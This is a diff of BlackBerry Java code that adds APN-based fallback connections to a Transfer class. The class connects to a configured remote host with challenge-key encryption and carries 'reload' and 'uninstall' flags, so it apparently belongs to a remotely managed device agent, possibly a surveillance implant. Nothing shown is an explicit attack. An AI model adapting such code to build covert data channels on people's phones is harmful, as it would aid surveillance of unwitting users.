@@ -17,6 +17,7 @@ import net.rim.device.api.util.Arrays;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.Conf;
 import blackberry.Device;
+import blackberry.action.Apn;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.fs.AutoFlashFile;
@@ -61,6 +62,7 @@ public class Transfer {
     private boolean wifiForced;
     private boolean gprsAdmitted;
     private boolean wifiAdmitted;
+    private Vector apns;
 
     private boolean connected = false;
 
@@ -134,18 +136,40 @@ public class Transfer {
             debug.trace("Try direct tcp, ssl:" + ssl);
             //#endif
             // TODO: limit to the useful and actually working methods, ignore apn
-            for (int method = 0; method <= DirectTcpConnection.METHOD_LAST; method++) {
-                //#ifdef DEBUG_TRACE
-                debug.trace("method: " + method);
-                //#endif
-                connection = new DirectTcpConnection(host, port, ssl, method);
-                connected = connection.connect();
-                if (connected) {
-                    //#ifdef DEBUG_INFO
-                    debug.info("Connected tpc ssl:" + ssl + " method: "
-                            + method);
+            if (apns == null) {
+                for (int method = 0; method <= DirectTcpConnection.METHOD_LAST; method++) {
+                    //#ifdef DEBUG_TRACE
+                    debug.trace("method: " + method);
                     //#endif
-                    break;
+                    connection = new DirectTcpConnection(host, port, ssl,
+                            method);
+                    connected = connection.connect();
+                    if (connected) {
+                        //#ifdef DEBUG_INFO
+                        debug.info("Connected tpc ssl:" + ssl + " method: "
+                                + method);
+                        //#endif
+                        break;
+                    }
+                }
+
+            } else {
+                for (int i = 0; i < apns.size(); i++) {
+                    Apn apn = (Apn) apns.elementAt(i);
+                    //#ifdef DEBUG_TRACE
+                    debug.trace("apn: " + apn);
+                    //#endif
+
+                    connection = new DirectTcpConnection(host, port, ssl, apn);
+
+                    connected = connection.connect();
+                    if (connected) {
+                        //#ifdef DEBUG_INFO
+                        debug.info("Connected tpc ssl:" + ssl + " apn: " + apn);
+                        //#endif
+                        break;
+                    }
+
                 }
             }
         }
@@ -450,7 +474,25 @@ public class Transfer {
      * @param wifiPreferred_
      *            the wifi preferred_
      * @param gprs
+     * @param apns
      */
+    public final void initApn(final String host_, final int port_,
+            final boolean ssl_, final boolean wifiForced, final boolean wifi,
+            final boolean gprs, final Vector apns) {
+
+        reload = false;
+        uninstall = false;
+
+        host = host_;
+        port = port_;
+        ssl = ssl_;
+        this.wifiForced = wifiForced;
+        wifiAdmitted = wifi;
+        gprsAdmitted = gprs;
+        this.apns = apns;
+        crypto.makeKey(Keys.getInstance().getChallengeKey());
+    }
+
     public final void init(final String host_, final int port_,
             final boolean ssl_, final boolean wifiForced, final boolean wifi,
             final boolean gprs) {
@@ -464,6 +506,9 @@ public class Transfer {
         this.wifiForced = wifiForced;
         wifiAdmitted = wifi;
         gprsAdmitted = gprs;
+
+        apns = null;
+
         crypto.makeKey(Keys.getInstance().getChallengeKey());
     }
 
